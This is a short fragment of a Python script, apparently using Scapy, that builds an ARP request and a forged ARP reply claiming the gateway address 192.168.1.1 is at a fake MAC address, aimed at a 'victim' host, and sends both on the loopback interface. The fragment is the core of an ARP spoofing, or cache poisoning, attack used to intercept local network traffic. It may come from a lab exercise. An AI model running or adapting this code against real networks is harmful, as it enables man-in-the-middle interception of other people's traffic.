...
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=spoof)

# ARP reply: 192.168.1.1 is at deadbeefcafe
arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=operation, psrc=spoof, pdst=victim, hwdst=mac)

sendp(arp_request, iface="lo")
sendp(arp_reply, iface="lo")
